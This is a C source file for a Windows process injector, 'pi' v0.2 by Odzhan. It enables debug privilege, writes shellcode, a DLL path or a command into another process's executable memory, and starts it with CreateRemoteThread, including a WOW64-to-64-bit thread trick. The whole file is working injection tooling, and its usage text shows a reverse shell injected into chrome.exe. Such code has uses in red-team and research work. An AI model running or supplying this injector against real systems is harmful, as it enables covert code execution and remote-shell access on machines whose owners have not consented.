/**
  Copyright © 2014-2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#define UNICODE  
#define _CRT_SECURE_NO_WARNINGS
#include "pi.h"

#if !defined (__GNUC__)
#pragma comment (lib, "Shell32.lib")
#pragma comment (lib, "advapi32.lib")
#endif

int GetMode(void)
{
  SYSTEM_INFO si;
  CONTEXT     c;
  DWORD       cpu;
  
  GetSystemInfo(&si);

  cpu=si.wProcessorArchitecture;
  
  ZeroMemory(&c, sizeof(c));
  c.ContextFlags = CONTEXT_SEGMENTS;

  GetThreadContext(GetCurrentThread(), &c);

  // if this is x86
  if (cpu==PROCESSOR_ARCHITECTURE_INTEL) {
    // gs will be zero for legacy systems - thanks hh86
    return c.SegGs==0 ? X86_MODE : WOW64_MODE;
  }
  return X64_MODE;
}

BOOL IsWow64(HANDLE hProcess)
{
  BOOL bWow64 = FALSE;
  pIsWow64Process IsWow64Processx;
  
  IsWow64Processx = (pIsWow64Process) GetProcAddress(
        GetModuleHandle(L"kernel32"),"IsWow64Process");

  if (NULL != IsWow64Processx)
  {
    IsWow64Processx(hProcess, &bWow64);  
  }
  return bWow64;
}

// set width of console screen buffer
void setw (SHORT X) {
  CONSOLE_SCREEN_BUFFER_INFO csbi;
  
  GetConsoleScreenBufferInfo (GetStdHandle (STD_OUTPUT_HANDLE), &csbi);
  
  if (X <= csbi.dwSize.X) return;
  csbi.dwSize.X = X;
  SetConsoleScreenBufferSize (GetStdHandle (STD_OUTPUT_HANDLE), csbi.dwSize);
}

// allocate memory
LPVOID xmalloc (SIZE_T dwSize) {
  return HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
}

// re-allocate memory
LPVOID xrealloc (LPVOID lpMem, SIZE_T dwSize) {
  return HeapReAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, lpMem, dwSize);
}

// free memory
VOID xfree (LPVOID lpMem) {
  HeapFree (GetProcessHeap(), 0, lpMem);
}

// display error message for last error code
void xstrerror (char *fmt, ...) {
  char    *error=NULL;
  va_list arglist;
  char    buffer[1024];
  DWORD   dwError=GetLastError();
  
  va_start (arglist, fmt);
  vsnprintf (buffer, sizeof(buffer) - 1, fmt, arglist);
  va_end (arglist);
  
  if (FormatMessage (
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
        (LPWSTR)&error, 0, NULL))
  {
    printf ("  [ %s : %ws\n", buffer, error);
    LocalFree (error);
  } else {
    printf ("  [ %s error : %08lX\n", buffer, dwError);
  }
}

// convert process name to id
DWORD name2pid (wchar_t name[], int exclude)
{
  HANDLE     hProc;
  DWORD      dwId=0, mode;
  BOOL       bWow64;
  LPVOID     procList;
  PPROCENTRY pe;
  
  procList = GetProcessList();
  
  if (procList!=NULL)
  {
    mode = GetMode();
    for (pe=procList; pe->id; pe++)
    {
      // is this what we're looking for?
      if (!lstrcmpi (pe->name, name)) 
      {
        // if we need to exclude some process
        if (exclude!=0)
        {
          hProc=OpenProcess (PROCESS_QUERY_INFORMATION, FALSE, pe->id);
          if (hProc!=NULL) {

            bWow64 = IsWow64(hProc);
            
            CloseHandle(hProc);
            
            // if we're excluding 32-bit process and this is Wow64, continue
            if (exclude==32 && bWow64) continue;
            
            // if we're excluding 64-bit apps,not Wow64, continue
            if (exclude==64 && !bWow64 && mode != X86_MODE) continue;  
            
            dwId = pe->id;
            break;
          }
        } else {
          dwId = pe->id;
          break;
        }
      }
    }
  }
  return dwId;
}

// get domain and user id for process
BOOL proc2uid (HANDLE hProc, wchar_t domain[], 
  PDWORD domlen, wchar_t username[], PDWORD ulen) 
{
    HANDLE       hToken;
    SID_NAME_USE peUse;
    PTOKEN_USER  pUser;
    BOOL         bResult     = FALSE;
    DWORD        dwTokenSize = 0, 
                 dwUserName  = 64, 
                 dwDomain    = 64;
    
    // try open security token
    if (!OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
      return FALSE;
    }
    
    ZeroMemory (domain, *domlen);
    ZeroMemory (username, *ulen);
    
    // try obtain user information size
    if (!GetTokenInformation (hToken, TokenUser, 
      0, 0, &dwTokenSize)) 
    {
      if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) 
      {
        pUser = xmalloc(dwTokenSize);
        if (pUser != NULL) 
        {
          if (GetTokenInformation (hToken, TokenUser, 
            pUser, dwTokenSize, &dwTokenSize)) 
          {
            bResult = LookupAccountSid (NULL, pUser->User.Sid, 
              username, ulen, domain, domlen, &peUse);
          }
          xfree (pUser);
        }
      }
    }
    CloseHandle (hToken);
    return bResult;
}

// list running process on system
DWORD pslist (int exclude)
{
  HANDLE         hSnap, hProc;
  DWORD          dwId = 0, ulen, dlen, mode=0;
  BOOL           bWow64;
  wchar_t        *cpu, *uid, *dom;
  wchar_t        domain[64], uname[64];
  LPVOID         procList;
  PPROCENTRY      pe;
  
  procList = GetProcessList();
  
  if (procList != NULL) 
  {
    printf("\n%-35s  %-5s   %5s     %s", "Image Name", "PID", "CPU", "domain\\username");
    printf("\n===================================  =====     ======  ===============\n");
    
    mode = GetMode();
    
    for (pe=(PPROCENTRY)procList; pe->id != 0; pe++)
    {      
      cpu = L"??";
      uid = L"??";
      dom = L"??";
      // open process to determine CPU mode and user information
      hProc=OpenProcess (PROCESS_QUERY_INFORMATION, FALSE, pe->id);
        
      if (hProc!=NULL) 
      {          
        bWow64 = IsWow64(hProc);
        
        ulen=sizeof(uname);
        dlen=sizeof(domain);
        
        if (proc2uid (hProc, domain, &dlen, uname, &ulen))
        {
          dom=domain;
          uid=uname;
        }      
        CloseHandle (hProc);
        
        // if we're excluding 32-bit process and this is Wow64, continue
        if (exclude==32 && bWow64) {
          continue;
        }
        
        // if we're excluding 64-bit apps and not Wow64, continue
        if (exclude==64 && !bWow64 && mode != X86_MODE) {
          continue;  
        }
            
        // if remote process is not wow64
        if (!bWow64) {
          // if we're running on 32-bit mode
          if (GetMode() == X86_MODE) {
            // it's a 32-bit process
            cpu = L"32";
          } else {
            // otherwise it's 64-bit
            cpu = L"64";
          }
        } else {
          cpu = L"32";
        }          
      }

      printf ("%-35ws  %-5lu  %5ws-bit  %ws\\%ws\n", 
        pe->name, pe->id, cpu, dom, uid);
    }
    xfree (procList);
  } else {
    xstrerror("GetProcessList");
  }
  return dwId;
}

#if !defined (__GNUC__)
/**
 *
 * Returns TRUE if process token is elevated
 *
 */
BOOL isElevated (VOID) {
  HANDLE          hToken;
  BOOL            bResult = FALSE;
  TOKEN_ELEVATION te;
  DWORD           dwSize;
    
  if (OpenProcessToken (GetCurrentProcess(), TOKEN_QUERY, &hToken)) 
  {
    if (GetTokenInformation (hToken, TokenElevation, &te,
        sizeof(TOKEN_ELEVATION), &dwSize)) 
    {
      bResult = te.TokenIsElevated != 0;
    }
    CloseHandle(hToken);
  }
  return bResult;
}
#endif

/**
*
* Enables or disables a named privilege in token
* Returns TRUE or FALSE
*
*/
BOOL set_priv (wchar_t szPrivilege[], BOOL bEnable) 
{
  HANDLE hToken;
  BOOL   bResult;
  LUID   luid;
  
  bResult = OpenProcessToken(GetCurrentProcess(),
    TOKEN_ADJUST_PRIVILEGES, &hToken);
  
  if (bResult) {    
    bResult = LookupPrivilegeValue(NULL, szPrivilege, &luid);
    if (bResult) {
      TOKEN_PRIVILEGES tp;
      
      tp.PrivilegeCount = 1;
      tp.Privileges[0].Luid = luid;
      tp.Privileges[0].Attributes = (bEnable) ? SE_PRIVILEGE_ENABLED : 0;

      bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    }
    CloseHandle(hToken);
  }
  return bResult;
}

LPVOID init_func (char *asmcode, DWORD len)
{
  LPVOID sc=NULL;
  
  // allocate write/executable memory for code
  sc = VirtualAlloc (0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (sc!=NULL) {
    // copy code
    memcpy (sc, asmcode, len);
  } else {
    xstrerror ("VirtualAlloc()");
  }
  return sc;
}

void free_func (LPVOID func) {
  if (func!=NULL) {
    VirtualFree(func, 0, MEM_RELEASE);
  }
}

// runs position independent code in remote process
BOOL inject (DWORD dwId, LPVOID pPIC, 
  SIZE_T dwCode, LPVOID lpParam, SIZE_T dwParam, DWORD dbg)
{
  HANDLE                hProc, hThread;
  BOOL                  bStatus=FALSE, bRemoteWow64, bLocalWow64;
  LPVOID                pCode=NULL, pData=NULL;
  SIZE_T                written;
  DWORD                 old, idx, ec;
  pCreateRemoteThread64 CreateRemoteThread64=NULL;
  char                  *process;
  DWORD                 mode = GetMode();
  
  // try open the process
  printf("  [ opening process id %lu\n", dwId);
  hProc = OpenProcess (PROCESS_ALL_ACCESS, FALSE, dwId);
  if (hProc != NULL)
  {
    // allocate memory there
    printf("  [ allocating %lu bytes of XRW memory in process for code\n", dwCode);
    pCode=VirtualAllocEx (hProc, 0, dwCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pCode != NULL)
    {
      // write the code
      printf("  [ writing %lu bytes of code to 0x%p\n", dwCode, pCode);
      bStatus=WriteProcessMemory (hProc, pCode, pPIC, dwCode, &written);
      
      if (bStatus) {
        /**printf("  [ changing memory attributes to RX\n");
        // change the protection to read/execute only
        VirtualProtectEx (hProc, pCode, dwCode, PAGE_EXECUTE_READ, &old);*/
        
        // is there a parameter required for PIC?
        if (lpParam != NULL) {
          printf("  [ allocating %lu bytes of RW memory in process for parameter\n", dwParam);
          pData=VirtualAllocEx (hProc, 0, dwParam+1, MEM_COMMIT, PAGE_READWRITE);
          if (pData != NULL)
          {
            printf("  [ writing %lu bytes of data to 0x%p\n", dwParam, pData);
            bStatus=WriteProcessMemory (hProc, pData, lpParam, dwParam, &written);
            if (!bStatus) {
              printf ("  [ warning: unable to allocate write parameters to process...");
            }
          }
        }
        
        bLocalWow64  = IsWow64(GetCurrentProcess());
        bRemoteWow64 = IsWow64(hProc);
        
        if (!bRemoteWow64 && mode != X86_MODE) {
          process="64";
        } else process="32";
        
        printf("  [ remote process is %s-bit\n", process);
                
        if (dbg) {
          printf("  [ attach debugger now or set breakpoint on %p\n", pCode);
          printf("  [ press any key to continue . . .\n");
          fgetc (stdin);
        }
        
        printf("  [ creating thread\n");
        
        // if remote process is not wow64 but I am,
        // make switch to 64-bit for thread creation.
        if (!bRemoteWow64 && bLocalWow64) 
        {
          hThread=NULL;
          //DebugBreak ();
          CreateRemoteThread64=(pCreateRemoteThread64)
            init_func(CREATETHREADPIC, CREATETHREADPIC_SIZE);
            
          CreateRemoteThread64 (hProc, NULL, 0,
              (LPTHREAD_START_ROUTINE)pCode, pData, 0, 0, &hThread);
        } else {
          hThread=CreateRemoteThread (hProc, NULL, 0, 
              (LPTHREAD_START_ROUTINE)pCode, pData, 0, 0);
        }
        if (hThread != NULL)
        {
          printf ("  [ waiting for thread %lx to terminate\n", (DWORD)hThread);
          idx=WaitForSingleObject (hThread, INFINITE);
          if (idx!=0) {
            xstrerror ("WaitForSingleObject");
          }
          ec=0;
          if (GetExitCodeThread(hThread, &ec)) {
            printf ("  [ exit code was %lu (%08lX)", ec, ec);
          }
          CloseHandle (hThread);
        } else {
          xstrerror ("CreateRemoteThread");
        }
      }
      if (idx==0) {
        VirtualFreeEx (hProc, pCode, 0, MEM_RELEASE);
        if (pData!=NULL) {
          VirtualFreeEx (hProc, pData, 0, MEM_RELEASE);
        }
      }
    } else {
      xstrerror ("VirtualFreeEx()");
    }
    CloseHandle (hProc);
  } else {
    xstrerror ("OpenProcess (%lu)", dwId);
  }
  if (CreateRemoteThread64!=NULL) free_func(CreateRemoteThread64);
  return bStatus;
}

BOOL FileExists (LPCTSTR szPath)
{
  DWORD dwAttrib = GetFileAttributes(szPath);

  return (dwAttrib != INVALID_FILE_ATTRIBUTES && 
         !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

// read a PIC file from disk into memory
BOOL read_pic (wchar_t f[], LPVOID *code, SIZE_T *code_size) {
  LPVOID pData;
  HANDLE hFile;
  DWORD  size;
  DWORD  read;
  BOOL   bStatus=FALSE;
  
  printf ("  [ opening %ws\n", f);
  hFile=CreateFile (f, GENERIC_READ, FILE_SHARE_READ,
      0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
  if (hFile != INVALID_HANDLE_VALUE)
  {
    printf ("  [ getting size\n");
    size = GetFileSize (hFile, 0);
    
    printf ("  [ allocating %lu bytes of memory for file\n", size);
    pData=xmalloc(size);
    if (pData != NULL)
    {
      printf ("  [ reading\n");
      bStatus=ReadFile (hFile, pData, size, &read, 0);
      *code=pData;
      *code_size=read;
    } else {
      xstrerror("HeapAlloc()");
    }
    CloseHandle (hFile);
  } else {
    xstrerror ("CreateFile()");
  }
  return bStatus;
}

wchar_t* getparam (int argc, wchar_t *argv[], int *i)
{
  int n=*i;
  if (argv[n][2] != 0) {
    return &argv[n][2];
  }
  if ((n+1) < argc) {
    *i=n+1;
    return argv[n+1];
  }
  printf ("  [ %c%c requires parameter\n", argv[n][0], argv[n][1]);
  exit (0);
}

void usage (void)
{
  printf("\n  usage: pi [options] <proc name | proc id>\n\n");
  printf("       -d          Wait after memory allocation before running thread\n");
  printf("       -e <cmd>    Execute command in context of remote process (shows window)\n");
  printf("       -f <file>   Load a PIC file into remote process\n");
  printf("       -l <dll>    Load a DLL file into remote process\n");
  printf("       -p          List available processes on system\n");
  printf("       -x <cpu>    Exclude process running in cpu mode, 32 or 64\n\n");
  printf(" examples:\n\n");
  printf("    pi -e \"cmd /c echo this is a test > test.txt & notepad test.txt\" -x32 iexplore.exe\n");
  printf("    pi -l ws2_32.dll notepad.exe\n");
  printf("    pi -f reverse_shell.bin chrome.exe\n");
  exit (0);
}

int main (void)
{
  SIZE_T  code_size=0;
  LPVOID  code=NULL;
  DWORD   pid=0, cpu_mode=0;
  wchar_t *proc=NULL, *pic=NULL; 
  wchar_t *dll=NULL, *cmd=NULL;
  wchar_t *cpu=NULL;
  int     i, plist=0, native=0, dbg=0;
  wchar_t opt;
  wchar_t **argv;
  int     argc;
  
  argv = CommandLineToArgvW(GetCommandLineW(), &argc);
  
  setw (300);
  
  printf("\n  [ PIC/DLL injector v0.2");
  printf("\n  [ Copyright (c) 2014-2017 Odzhan\n\n");
  
  for (i=1; i<argc; i++) {
    if (argv[i][0]==L'/' || argv[i][0]==L'-') {
      opt=argv[i][1];
      switch (opt) {
        // wait after memory allocation before running thread
        case L'd' :
          dbg=1;
          break;
        // Execute command in remote process
        case L'e' :
          cmd=getparam (argc, argv, &i);
          break;
        // Load PIC file into remote process
        case L'f' :
          pic=getparam (argc, argv, &i);
          break;
        // Load DLL into remote process
        case L'l' :
          dll=getparam (argc, argv, &i);
          break;
        // List running processes
        case L'p' :
          plist=1;
          break;
        // cpu mode
        case L'x' :
          cpu=getparam (argc, argv, &i);
          break;
        case L'?' :
        case L'h' :
        default  : { usage (); break; }
      }
    } else {
      // assume it's process name or id
      proc=argv[i];
    }
  }
#if !defined (__GNUC__)  
  // check if we're elevated token just incase target requires it
  if (!isElevated ()) {
    printf ("  [ warning: current process token isn't elevated\n");
  }
#endif

  // enable debug privilege in case remote process requires it
  if (!set_priv (SE_DEBUG_NAME, TRUE)) {
    printf ("  [ warning: unable to enable debug privilege\n");
  }

  if (cpu!=NULL) {
    cpu_mode=wcstol (cpu, NULL, 10);
    if (cpu_mode!=32 && cpu_mode!=64) {
      printf ("  [ invalid cpu mode. 32 and 64 are valid");
      return 0;
    }
  }
  
  // list process?
  if (plist) {
    pslist(cpu_mode);
    return 0;
  }
  
  // no target process?
  if (proc==NULL) {
    printf ("  [ no target process specified\n");
    usage();
  }
  
  // try convert proc to integer
  pid=wcstol (proc, NULL, 10);
  
  if (pid==0) {
    printf ("  [ searching %s-bit processes for %ws\n", 
      cpu_mode==0 ? "32 and 64" : (cpu_mode==64 ? "32" : "64"), proc);
    // else get id from name
    pid=name2pid (proc, cpu_mode);
  }
  
  // no target action?
  if (cmd==NULL && dll==NULL && pic==NULL) {
    printf ("  [ no action specified for %ws\n", proc);
    usage();
  }
  
  // have a pid?
  if (pid == 0)
  {
    printf ("  [ unable to obtain process id for %ws\n", proc);
    return 0;
  }
  
  // is it ourselves?
  if (pid==GetCurrentProcessId()) {
    printf ("  [ cannot injekt self, bye\n");
  } else {
    // no, is this a PIC
    if (pic != NULL) {
      if (read_pic (pic, &code, &code_size)) {
        // injekt pic code without parameters
        inject (pid, code, code_size, NULL, 0, dbg);
        xfree (code);
      }
    } else 
    // is this DLL for LoadLibrary?
    if (dll != NULL) {
      inject (pid, LOADDLLPIC, LOADDLLPIC_SIZE, dll, lstrlen(dll), dbg);
    } else
    // is this command for WinExec?
    if (cmd != NULL) {
      inject (pid, EXECPIC, EXECPIC_SIZE, cmd, lstrlen(cmd), dbg);
    }
  }
  return 0;
}
